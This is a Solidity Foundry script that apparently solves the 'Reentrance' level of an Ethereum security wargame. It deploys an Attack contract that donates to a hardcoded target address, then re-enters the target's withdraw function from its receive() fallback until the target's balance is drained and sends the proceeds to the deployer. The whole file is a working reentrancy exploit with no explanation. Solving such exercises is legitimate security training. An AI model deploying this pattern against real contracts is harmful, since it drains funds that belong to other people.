// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Reentrance} from "../src/10_Reentrance.sol";
import {Script, console} from "forge-std/Script.sol";

contract ReentranceSolve is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack attack = new Attack{value: 0.001 ether}();
        attack.withdraw();

        vm.stopBroadcast();
    }
}

contract Attack {
    Reentrance instance = Reentrance(0x996EC7534069d31800ef45bAD9fbc8abB63465e6);
    address owner;
    uint256 balance;

    constructor() public payable {
        owner = msg.sender;
        instance.donate{value: msg.value}(address(this));
        balance = instance.balanceOf(address(this));
    }

    function withdraw() external {
        require(owner == msg.sender);
        instance.withdraw(balance);
        address(msg.sender).call{value: address(this).balance}("");
    }

    receive() external payable {
        if (address(instance).balance >= balance) {
            instance.withdraw(balance);
        }
    }
}
